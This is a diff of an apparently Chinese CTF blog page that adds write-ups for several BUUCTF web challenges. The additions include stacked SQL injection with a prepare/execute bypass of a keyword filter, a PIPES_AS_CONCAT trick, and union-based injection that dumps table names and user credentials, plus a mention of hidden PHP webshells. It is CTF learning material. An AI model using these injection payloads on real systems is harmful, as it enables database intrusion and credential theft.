@@ -121,8 +121,26 @@
 <meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce4.jpg">
 <meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce5.jpg">
 <meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_serialize_php/easy_serialize_php0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easy_sql0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql1.png">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql2.png">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql4.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql5.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql6.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql7.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker2.jpg">
 <meta property="article:published_time" content="2020-03-14T09:13:19.000Z">
-<meta property="article:modified_time" content="2020-05-13T14:11:03.094Z">
+<meta property="article:modified_time" content="2020-05-20T16:36:04.940Z">
 <meta property="article:author" content="w1ndy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://q63cs67co.bkt.clouddn.com/buuctf_login_1.PNG">
@@ -323,8 +341,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-05-13T22:11:03+08:00">
-                2020-05-13
+              <time title="更新于" itemprop="dateModified" datetime="2020-05-21T00:36:04+08:00">
+                2020-05-21
               </time>
             
           </span>
@@ -418,6 +436,50 @@
 <p>在代码最下方发现如果$function == ‘phpinfo’，就可以访问phpinfo，它说那里有提示</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=phpinfo</span><br></pre></td></tr></table></figure>
 <p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_serialize_php/easy_serialize_php0.jpg" alt=""><br>接下来就是想办法读取d0g3_f1ag.php</p>
+<h3 id="强网杯-2019-随便注-堆叠注入、预编译绕过"><a href="#强网杯-2019-随便注-堆叠注入、预编译绕过" class="headerlink" title="[强网杯 2019]随便注(堆叠注入、预编译绕过)"></a>[强网杯 2019]随便注(堆叠注入、预编译绕过)</h3><p>测试注入点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">'          //报错</span></span><br><span class="line"><span class="string">1'</span> --+      //没报错</span><br></pre></td></tr></table></figure>
+<p>单引号注入，判断一下列数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' order by 2 --+       列数为3时报错，说明只有两列</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0<span class="string">' union select 1,2 --+</span></span><br></pre></td></tr></table></figure>
+<p>返回了一段代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure>
+<p>对关键字进行了过滤，我也不知道咋绕过啊，大佬说利用堆叠注入绕过过滤</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0<span class="string">';show tables --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easy_sql0.jpg" alt=""><br>发现有两个表，挨个爆字段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0<span class="string">';show columns from `1919810931114514` --+         这里表名要加反引号,不是单引号</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql1.jpg" alt=""><br>不用爆words表了，接下里就是要查flag，但是关键字被过滤了。这里可以利用预编译绕过select限制<br>预编译相关语法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>:用于设置变量名和变量值</span><br><span class="line">prepare:用于预备一个语句，并赋予名称，以后可以引用该语句</span><br><span class="line">execute:执行预备的语句</span><br><span class="line">deallocate prepare:释放预处理语句</span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0<span class="string">';set @sql=concat('</span>selec<span class="string">','</span>t * from `1919810931114514`;<span class="string">');prepare stmt_name from @sql;execute stmt_name --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql2.jpg" alt=""><br>过滤了set和prepare,但是strstr()函数对大小写不敏感<br>payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0<span class="string">';Set @sql=concat('</span>selec<span class="string">','</span>t * from `1919810931114514`;<span class="string">');Prepare stmt_name from @sql;execute stmt_name --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql3.jpg" alt=""></p>
+<h3 id="SUCTF-2019-EasySQL-堆叠注入"><a href="#SUCTF-2019-EasySQL-堆叠注入" class="headerlink" title="[SUCTF 2019]EasySQL(堆叠注入)"></a>[SUCTF 2019]EasySQL(堆叠注入)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1               //返回Array ( [0] =&gt; 1 )</span><br><span class="line">1<span class="string">'              //无返回</span></span><br><span class="line"><span class="string">1'</span> or <span class="string">'1'</span>=<span class="string">'1    //返回Nonono.</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql0.jpg" alt=""><br>使用堆叠注入爆一下表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show tables;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql1.png" alt=""><br>大佬说官方给出的查询代码是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="variable">$post</span>[<span class="string">'query'</span>]||flag from Flag</span><br></pre></td></tr></table></figure>
+<p>这里就是要想办法让||的作用不再是逻辑或，而是连接符<br>官方payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="built_in">set</span> sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
+<p>在oracle中缺省支持通过’||’来实现字符串拼接，但在mysql中缺省不支持，需要调整mysql 的sql_mode<br>模式：pipes_as_concat 来实现oracle 的一些功能<br>拼接一下就是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1;<span class="built_in">set</span> sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</span><br></pre></td></tr></table></figure>
+<p>sql_mode:它定义了MySQL应支持的SQL语法，以及应该在数据上做何种确认检查，其中的PIPES_AS_CONCAT会将||当作字符串的连接操作符，在该模式下进行查询时，使用字母连接会报错，只有使用数字连接才能够查询成功.这里select 1||flag from Flag相当于执行了select 1和select flag from Flag这两个查询操作<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql2.png" alt=""></p>
+<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>测试万能密码，直接就登陆进去了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql0.jpg" alt=""><br>使用给出的密码登陆，接下来进行注入点测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin<span class="string">'&amp;password=123</span></span><br></pre></td></tr></table></figure>
+<p>单引号注入，order by爆字段数,最终字段为4时报错，说明字段数为3</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin<span class="string">' order by 3%23&amp;password=123</span></span><br></pre></td></tr></table></figure>
+<p>判断注入字段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,3%23&amp;password=123</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql1.jpg" alt=""><br>回显点为2，3<br>爆数据库名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,database()%23&amp;password=123</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql2.jpg" alt=""><br>数据库名为geek,爆表名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=123</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql3.jpg" alt=""><br>得到表名：geekuser,l0ve1ysq1<br>爆字段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>geekuser<span class="string">'%23&amp;password=123</span></span><br><span class="line"><span class="string">?username=0'</span> union select 1,2,group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'l0ve1ysq1'</span>%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql4.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql5.jpg" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,group_concat(id,0x3a,username,0x3a,password) from geekuser%23&amp;password=123</span></span><br><span class="line"><span class="string">?username=0'</span> union select 1,2,group_concat(id,0x3a,username,0x3a,password) from l0ve1ysq1%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql6.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql7.jpg" alt=""></p>
+<h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker0.jpg" alt=""><br>下载后打开<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker1.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker2.jpg" alt=""><br>很多这种PHP文件,从其中的内容可以看出是一句话木马，但是很多都是混淆视听的，很明显被置空了，这道题就是要编写脚本来找出真正有效的一句话木马</p>
 
       
     </div>
@@ -584,7 +646,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#HCTF-2018-admin"><span class="nav-text">[HCTF 2018]admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Havefun"><span class="nav-text">[极客大挑战 2019]Havefun</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Secret-File"><span class="nav-text">[极客大挑战 2019]Secret File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Knife"><span class="nav-text">[极客大挑战 2019]Knife</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Http"><span class="nav-text">[极客大挑战 2019]Http</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-Include"><span class="nav-text">[ACTF2020 新生赛]Include</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-BackupFile"><span class="nav-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-Exec"><span class="nav-text">[ACTF2020 新生赛]Exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GXYCTF2019-禁止套娃"><span class="nav-text">[GXYCTF2019]禁止套娃</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安洵杯-2019-easy-serialize-php"><span class="nav-text">[安洵杯 2019]easy_serialize_php</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#HCTF-2018-admin"><span class="nav-text">[HCTF 2018]admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Havefun"><span class="nav-text">[极客大挑战 2019]Havefun</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Secret-File"><span class="nav-text">[极客大挑战 2019]Secret File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Knife"><span class="nav-text">[极客大挑战 2019]Knife</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Http"><span class="nav-text">[极客大挑战 2019]Http</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-Include"><span class="nav-text">[ACTF2020 新生赛]Include</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-BackupFile"><span class="nav-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-Exec"><span class="nav-text">[ACTF2020 新生赛]Exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GXYCTF2019-禁止套娃"><span class="nav-text">[GXYCTF2019]禁止套娃</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安洵杯-2019-easy-serialize-php"><span class="nav-text">[安洵杯 2019]easy_serialize_php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#强网杯-2019-随便注-堆叠注入、预编译绕过"><span class="nav-text">[强网杯 2019]随便注(堆叠注入、预编译绕过)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SUCTF-2019-EasySQL-堆叠注入"><span class="nav-text">[SUCTF 2019]EasySQL(堆叠注入)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-LoveSQL"><span class="nav-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#强网杯-2019-高明的黑客"><span class="nav-text">[强网杯 2019]高明的黑客</span></a></li></ol></div>
             
 
           </div>
